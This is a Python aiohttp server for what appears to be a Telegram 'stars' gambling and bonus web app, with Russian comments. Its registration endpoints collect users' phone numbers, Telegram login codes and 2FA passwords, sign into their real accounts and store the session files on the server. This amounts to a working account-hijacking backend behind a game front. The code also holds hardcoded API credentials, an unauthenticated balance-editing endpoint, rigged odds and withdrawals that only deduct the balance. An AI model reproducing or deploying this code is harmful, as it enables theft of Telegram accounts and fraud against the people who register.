import asyncio
import json
import os
import random
from datetime import datetime
from aiohttp import web
from telethon import TelegramClient, errors
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
from telethon.tl.functions.contacts import SearchRequest
from telethon.tl.types import InputPeerUser
import aiohttp_cors

# Конфигурация Telegram API
API_ID = 21826549
API_HASH = 'c1a19f792cfd9e397200d16c7e448160'
SESSION_DIR = 'web_sessions'

# Хранилище данных (в памяти)
users = {}  # user_id -> user_data
pending_phones = {}  # phone -> user_id (временно)
pending_codes = {}  # phone -> code
sessions = {}  # phone -> TelegramClient
user_states = {}  # user_id -> state

# Создаем директорию для сессий
os.makedirs(SESSION_DIR, exist_ok=True)

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(
        allow_credentials=True,
        expose_headers="*",
        allow_headers="*",
    )
})

# Вспомогательные функции
def generate_code():
    return str(random.randint(10000, 99999))

async def get_client(phone):
    """Создает или возвращает клиент Telethon для номера телефона"""
    if phone in sessions:
        return sessions[phone]
    
    session_path = os.path.join(SESSION_DIR, f"{phone}.session")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    sessions[phone] = client
    return client

# API Endpoints
async def search_profiles(request):
    """Поиск пользователей в Telegram по юзернейму"""
    data = await request.json()
    query = data.get('query', '').strip().lstrip('@')
    
    if not query:
        return web.json_response({'error': 'Пустой запрос'}, status=400)
    
    try:
        # Создаем временный клиент для поиска (без авторизации)
        temp_session = os.path.join(SESSION_DIR, 'temp_search.session')
        client = TelegramClient(temp_session, API_ID, API_HASH)
        await client.connect()
        
        profiles = []
        
        # Пытаемся найти пользователя по юзернейму
        try:
            user = await client.get_entity(query)
            if user:
                profiles.append({
                    'id': user.id,
                    'first_name': user.first_name or '',
                    'last_name': user.last_name or '',
                    'username': user.username or '',
                    'phone': user.phone or ''
                })
        except Exception as e:
            # Если не нашли точно, ищем похожих
            pass
        
        # Ищем в контактах
        try:
            result = await client(SearchRequest(
                q=query,
                limit=20
            ))
            
            for user in result.users:
                if not user.bot and (user.username and query.lower() in user.username.lower()):
                    profiles.append({
                        'id': user.id,
                        'first_name': user.first_name or '',
                        'last_name': user.last_name or '',
                        'username': user.username or '',
                        'phone': user.phone or ''
                    })
        except Exception as e:
            print(f"Search error: {e}")
        
        await client.disconnect()
        
        # Убираем дубликаты
        unique_profiles = []
        seen_ids = set()
        for profile in profiles:
            if profile['id'] not in seen_ids:
                seen_ids.add(profile['id'])
                unique_profiles.append(profile)
        
        return web.json_response({'profiles': unique_profiles[:10]})
        
    except Exception as e:
        return web.json_response({'error': f'Ошибка поиска: {str(e)}'}, status=500)

async def register_start(request):
    """Начало регистрации: отправка номера телефона"""
    data = await request.json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return web.json_response({'error': 'Номер телефона не указан'}, status=400)
    
    # Генерируем код для демонстрации (в реальности придет через Telegram)
    code = generate_code()
    pending_codes[phone] = code
    
    try:
        client = await get_client(phone)
        
        # Отправляем запрос на код
        sent = await client.send_code_request(phone)
        phone_code_hash = sent.phone_code_hash
        
        # Сохраняем хэш для проверки кода
        pending_phones[phone] = {
            'phone_code_hash': phone_code_hash,
            'user_id': None,
            'timestamp': datetime.now()
        }
        
        # Для демонстрации возвращаем код
        return web.json_response({
            'message': 'Код отправлен в Telegram',
            'phone_code_hash': phone_code_hash,
            'code': code  # В реальном приложении НЕ возвращаем код!
        })
        
    except errors.PhoneNumberInvalidError:
        return web.json_response({'error': 'Неверный номер телефона'}, status=400)
    except errors.PhoneNumberUnoccupiedError:
        return web.json_response({'error': 'Номер не зарегистрирован в Telegram'}, status=400)
    except errors.PhoneNumberFloodError:
        return web.json_response({'error': 'Слишком много запросов. Попробуйте позже'}, status=429)
    except Exception as e:
        return web.json_response({'error': f'Ошибка отправки кода: {str(e)}'}, status=500)

async def verify_code(request):
    """Проверка кода и завершение регистрации"""
    data = await request.json()
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phone_code_hash', '')
    
    if not phone or not code:
        return web.json_response({'error': 'Не указан номер телефона или код'}, status=400)
    
    if phone not in pending_phones:
        return web.json_response({'error': 'Номер телефона не найден'}, status=400)
    
    try:
        client = await get_client(phone)
        phone_data = pending_phones[phone]
        
        # Пытаемся войти с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_data['phone_code_hash']
        )
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        
        # Сохраняем пользователя
        user_id = me.id
        users[user_id] = {
            'id': user_id,
            'phone': phone,
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'username': me.username or '',
            'session': f"{phone}.session",
            'balance': 100,  # Стартовый бонус
            'stars': 100,
            'refs': [],
            'verified_refs': [],
            'reg_date': datetime.now().isoformat(),
            'last_bonus': None,
            'bonus_streak': 0,
            'games_played': 0,
            'total_wins': 0
        }
        
        # Создаем реферальный код
        ref_code = f"ref_{user_id}_{int(datetime.now().timestamp())}"
        users[user_id]['ref_code'] = ref_code
        
        # Очищаем временные данные
        del pending_phones[phone]
        if phone in pending_codes:
            del pending_codes[phone]
        
        return web.json_response({
            'success': True,
            'user': users[user_id],
            'message': 'Регистрация успешна'
        })
        
    except errors.SessionPasswordNeededError:
        return web.json_response({'error': 'Требуется пароль 2FA'}, status=400)
    except errors.PhoneCodeInvalidError:
        return web.json_response({'error': 'Неверный код'}, status=400)
    except errors.PhoneCodeExpiredError:
        return web.json_response({'error': 'Код устарел'}, status=400)
    except Exception as e:
        return web.json_response({'error': f'Ошибка верификации: {str(e)}'}, status=500)

async def verify_password(request):
    """Верификация с паролем 2FA"""
    data = await request.json()
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return web.json_response({'error': 'Не указан номер телефона или пароль'}, status=400)
    
    try:
        client = await get_client(phone)
        
        # Пытаемся войти с паролем
        await client.sign_in(password=password)
        
        me = await client.get_me()
        user_id = me.id
        
        users[user_id] = {
            'id': user_id,
            'phone': phone,
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'username': me.username or '',
            'session': f"{phone}.session",
            'balance': 100,
            'stars': 100,
            'refs': [],
            'verified_refs': [],
            'reg_date': datetime.now().isoformat(),
            'last_bonus': None,
            'bonus_streak': 0,
            'games_played': 0,
            'total_wins': 0
        }
        
        ref_code = f"ref_{user_id}_{int(datetime.now().timestamp())}"
        users[user_id]['ref_code'] = ref_code
        
        return web.json_response({
            'success': True,
            'user': users[user_id],
            'message': 'Регистрация с 2FA успешна'
        })
        
    except errors.PasswordHashInvalidError:
        return web.json_response({'error': 'Неверный пароль'}, status=400)
    except Exception as e:
        return web.json_response({'error': f'Ошибка верификации 2FA: {str(e)}'}, status=500)

async def get_user(request):
    """Получение информации о пользователе"""
    user_id = request.query.get('user_id')
    
    if not user_id or int(user_id) not in users:
        return web.json_response({'error': 'Пользователь не найден'}, status=404)
    
    return web.json_response({'user': users[int(user_id)]})

async def update_balance(request):
    """Обновление баланса пользователя"""
    data = await request.json()
    user_id = data.get('user_id')
    amount = data.get('amount', 0)
    
    if not user_id or int(user_id) not in users:
        return web.json_response({'error': 'Пользователь не найден'}, status=404)
    
    users[int(user_id)]['balance'] += amount
    users[int(user_id)]['stars'] += amount
    
    return web.json_response({
        'success': True,
        'new_balance': users[int(user_id)]['balance'],
        'new_stars': users[int(user_id)]['stars']
    })

async def play_game(request):
    """Игра на ставку"""
    data = await request.json()
    user_id = data.get('user_id')
    game_type = data.get('game_type')
    bet_amount = data.get('bet_amount', 0)
    
    if not user_id or int(user_id) not in users:
        return web.json_response({'error': 'Пользователь не найден'}, status=404)
    
    user = users[int(user_id)]
    
    if user['balance'] < bet_amount:
        return web.json_response({'error': 'Недостаточно средств'}, status=400)
    
    # Симуляция игры
    win_chance = random.random()
    win_multiplier = 0
    
    if game_type == 'slots':
        if win_chance < 0.3:
            win_multiplier = random.choice([2.0, 3.0, 5.0])
    elif game_type == 'dice':
        if win_chance < 0.5:
            win_multiplier = 2.0
    elif game_type == 'cards':
        if win_chance < 0.45:
            win_multiplier = 2.0
    elif game_type == 'basketball':
        if win_chance < 0.4:
            win_multiplier = 2.0
    
    win_amount = int(bet_amount * win_multiplier)
    result = win_amount - bet_amount
    
    # Обновляем баланс
    user['balance'] = user['balance'] - bet_amount + win_amount
    user['stars'] = user['stars'] - bet_amount + win_amount
    user['games_played'] += 1
    
    if win_amount > bet_amount:
        user['total_wins'] += (win_amount - bet_amount)
    
    return web.json_response({
        'success': True,
        'win_amount': win_amount,
        'result': result,
        'new_balance': user['balance'],
        'multiplier': win_multiplier
    })

async def get_daily_bonus(request):
    """Получение ежедневного бонуса"""
    data = await request.json()
    user_id = data.get('user_id')
    
    if not user_id or int(user_id) not in users:
        return web.json_response({'error': 'Пользователь не найден'}, status=404)
    
    user = users[int(user_id)]
    today = datetime.now().date().isoformat()
    
    if user.get('last_bonus') == today:
        return web.json_response({'error': 'Бонус уже получен сегодня'}, status=400)
    
    # Увеличиваем серию
    streak = user.get('bonus_streak', 0) + 1
    bonus = min(50 + streak * 10, 200)
    
    # Начисляем бонус
    user['balance'] += bonus
    user['stars'] += bonus
    user['last_bonus'] = today
    user['bonus_streak'] = streak
    
    return web.json_response({
        'success': True,
        'bonus_amount': bonus,
        'streak': streak,
        'new_balance': user['balance']
    })

async def withdraw_request(request):
    """Запрос на вывод средств"""
    data = await request.json()
    user_id = data.get('user_id')
    amount = data.get('amount', 0)
    target_username = data.get('target_username', '').lstrip('@')
    
    if not user_id or int(user_id) not in users:
        return web.json_response({'error': 'Пользователь не найден'}, status=404)
    
    user = users[int(user_id)]
    
    if amount < 100:
        return web.json_response({'error': 'Минимальная сумма вывода: 100 звёзд'}, status=400)
    
    if amount > user['balance']:
        return web.json_response({'error': 'Недостаточно средств'}, status=400)
    
    if amount > 10000:
        return web.json_response({'error': 'Максимальная сумма за раз: 10000 звёзд'}, status=400)
    
    # Резервируем средства
    user['balance'] -= amount
    user['stars'] -= amount
    
    # В реальном приложении здесь была бы отправка в очередь на обработку
    return web.json_response({
        'success': True,
        'message': f'Заявка на вывод {amount} ⭐ пользователю @{target_username} принята',
        'new_balance': user['balance']
    })

async def get_stats(request):
    """Получение статистики системы"""
    total_users = len(users)
    total_stars = sum(user.get('stars', 0) for user in users.values())
    total_balance = sum(user.get('balance', 0) for user in users.values())
    total_games = sum(user.get('games_played', 0) for user in users.values())
    
    return web.json_response({
        'total_users': total_users,
        'total_stars': total_stars,
        'total_balance': total_balance,
        'total_games': total_games,
        'active_sessions': len(sessions)
    })

# Настройка маршрутов
app.router.add_post('/api/search', search_profiles)
app.router.add_post('/api/register/start', register_start)
app.router.add_post('/api/register/verify', verify_code)
app.router.add_post('/api/register/2fa', verify_password)
app.router.add_get('/api/user', get_user)
app.router.add_post('/api/balance/update', update_balance)
app.router.add_post('/api/game/play', play_game)
app.router.add_post('/api/bonus/daily', get_daily_bonus)
app.router.add_post('/api/withdraw', withdraw_request)
app.router.add_get('/api/stats', get_stats)

# Настройка CORS для всех маршрутов
for route in list(app.router.routes()):
    cors.add(route)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=8080)
